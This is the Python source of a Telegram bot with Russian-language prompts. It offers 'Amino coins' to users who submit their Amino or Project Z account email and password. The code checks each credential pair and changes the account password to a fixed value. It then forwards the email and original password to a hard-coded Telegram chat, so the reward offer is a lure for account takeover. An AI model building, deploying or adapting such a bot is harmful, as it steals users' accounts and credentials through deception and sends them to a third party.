from aiogram.bot.bot import Bot as BaseBot
from aiogram.dispatcher.dispatcher import Dispatcher as BaseDispatcher
from aiogram import executor
from aiogram.types.message import Message
from aiogram.types import KeyboardButton
from aiogram.types import ReplyKeyboardMarkup
from aiogram.types import ReplyKeyboardRemove
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from .ntfunc.amino import Amino
from .ntfunc.z import Z
from .configs.telegram_config import bot_token
from .states import States


class Bot(BaseBot, BaseDispatcher):
    def __init__(self) -> None:
        BaseBot.__init__(self=self, token=bot_token)
        BaseDispatcher.__init__(self=self, bot=self, storage=MemoryStorage())

    def get_reply_keyboard(self, buttons: list[KeyboardButton]) -> ReplyKeyboardMarkup:
        keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
        for button in buttons:
            keyboard.add(button)
        return keyboard

    async def start_handler(self, message: Message) -> None:
        await self.send_message(
            message.from_user.id,
            (
                f"Привет, {message.from_user.username}!\n"
                "Я - бот VGDW, отправив аккаунт которому ты сможешь получить амино монеты.\n"
                "На данный момент принимаются: \n\n"
                "1. Аккаунты Amino\n"
                "2. Аккаунты Project Z\n\n"
                "Что ты выбираешь?"
            ),
            reply_markup=self.get_reply_keyboard([
                KeyboardButton("Я хочу отправить Amino аккаунт"),
                KeyboardButton("Я хочу отправить аккаунт Project Z")
            ])
        )

    async def accept_amino_account(self, message: Message) -> None:
        await self.send_message(
            message.from_user.id,
            "Введи почту от аккаунта Amino",
            reply_markup=ReplyKeyboardRemove()
        )
        await States.waiting_for_amino_email.set()

    async def accept_z_account(self, message: Message) -> None:
        await self.send_message(
            message.from_user.id,
            "Введи почту от аккаунта Project Z",
            reply_markup=ReplyKeyboardRemove()
        )
        await States.waiting_for_project_z_email.set()

    async def accept_amino_account_step_2(self, message: Message, state: FSMContext) -> None:
        await state.update_data(amino_email=message.text)
        await self.send_message(
            message.from_user.id,
            "Принято, теперь - введи пароль"
        )
        await States.waiting_for_amino_password.set()

    async def accept_project_z_account_step_2(self, message: Message, state: FSMContext) -> None:
        await state.update_data(z_email=message.text)
        await self.send_message(
            message.from_user.id,
            "Принято, теперь - введи пароль"
        )
        await States.waiting_for_project_z_password.set()

    async def accept_amino_account_step_3(self, message: Message, state: FSMContext) -> None:
        email = (await state.get_data())["amino_email"]
        await self.send_message(
            message.from_user.id,
            (
                "Аккаунт (Amino): \n\n"
                f"Почта: {email}\n"
                f"Пароль: {message.text}\n\n"
                "Проверяем..."
            )
        )
        new_instance = Amino()
        result = await new_instance.check_account(email, message.text)
        if result == 0:
            await self.send_message(
                message.from_user.id,
                "Аккаунт проверен"
            )
            await state.finish()
            await new_instance.change_credentials(email, message.text, "vgdw_-123")
            await self.send_message(
                message.from_user.id,
                "Пароль изменён"
            )
            await self.send_message(
                -720600915,
                (
                    "Новый аккаунт (Project Z)! \n\n"
                    f"Почта: {email}\n"
                    f"Старый пароль: {message.text}\n"
                )
            )
            await state.finish()
            await self.send_message(
                message.from_user.id,
                "Введите ссылку на пост для вознаграждения"
            )
            await States.waiting_for_post_link.set()
        elif result == 1:
            await self.send_message(
                message.from_user.id,
                "Неверный пароль"
            )
            await state.finish()
            return
        elif result == 2:
            await self.send_message(
                message.from_user.id,
                "Аккаунта не существует"
            )
            await state.finish()
            return
        elif result == 3:
            await self.send_message(
                message.from_user.id,
                "Неверная почта"
            )
            await state.finish()
            return

    async def accept_project_z_account_step_3(self, message: Message, state: FSMContext) -> None:
        email = (await state.get_data())["z_email"]
        await self.send_message(
            message.from_user.id,
            (
                "Аккаунт (Project Z): \n\n"
                f"Почта: {email}\n"
                f"Пароль: {message.text}\n\n"
                "Проверяем..."
            )
        )
        new_instance = Z()
        result = await new_instance.check_account(email, message.text)
        if result == 0:
            await self.send_message(
                message.from_user.id,
                "Аккаунт проверен"
            )
            await new_instance.change_credentials(email, message.text, "vgdw_-123")
            await self.send_message(
                message.from_user.id,
                "Пароль изменён"
            )
            await self.send_message(
                -720600915,
                (
                    "Новый аккаунт (Project Z)! \n\n"
                    f"Почта: {email}\n"
                    f"Старый пароль: {message.text}\n"
                )
            )
            await state.finish()
            await self.send_message(
                message.from_user.id,
                "Введите ссылку на пост для вознаграждения"
            )
            await States.waiting_for_post_link.set()
        elif result == 1:
            await self.send_message(
                message.from_user.id,
                "Аккаунта не существует"
            )
            await state.finish()
            return
        elif result == 2:
            await self.send_message(
                message.from_user.id,
                "Неверный пароль"
            )
            await state.finish()
            return
        elif result == 3:
            await self.send_message(
                message.from_user.id,
                "Неверная почта"
            )
            await state.finish()
            return

    async def reward(self, message: Message, state: FSMContext) -> None:
        result = await Amino.send_coins(message.text, 100)
        if result == 1:
            await self.send_message(
                message.from_user.id,
                "Неверная ссылка на пост, транзакция отменена"
            )
            await state.finish()
            return
        elif result == 2:
            await self.send_message(
                message.from_user.id,
                "Не удалось войти в сообществе, транзакция отменена"
            )
            await state.finish()
            return
        elif result == 3:
            await self.send_message(
                message.from_user.id,
                "Транзакция отменена из-за неизвестной ошибки"
            )
            await state.finish()
            return
        await self.send_message(
            message.from_user.id,
            "Монеты отправлены"
        )
        await state.finish()

    def start(self):
        self.register_message_handler(self.start_handler, commands=["start", "help"])
        self.register_message_handler(self.accept_amino_account, text="Я хочу отправить Amino аккаунт")
        self.register_message_handler(self.accept_z_account, text="Я хочу отправить аккаунт Project Z")
        self.register_message_handler(self.accept_amino_account_step_2, state=States.waiting_for_amino_email)
        self.register_message_handler(self.accept_project_z_account_step_2, state=States.waiting_for_project_z_email)
        self.register_message_handler(self.accept_amino_account_step_3, state=States.waiting_for_amino_password)
        self.register_message_handler(self.accept_project_z_account_step_3, state=States.waiting_for_project_z_password)
        self.register_message_handler(self.reward, state=States.waiting_for_post_link)
        executor.start_polling(self, skip_updates=True)
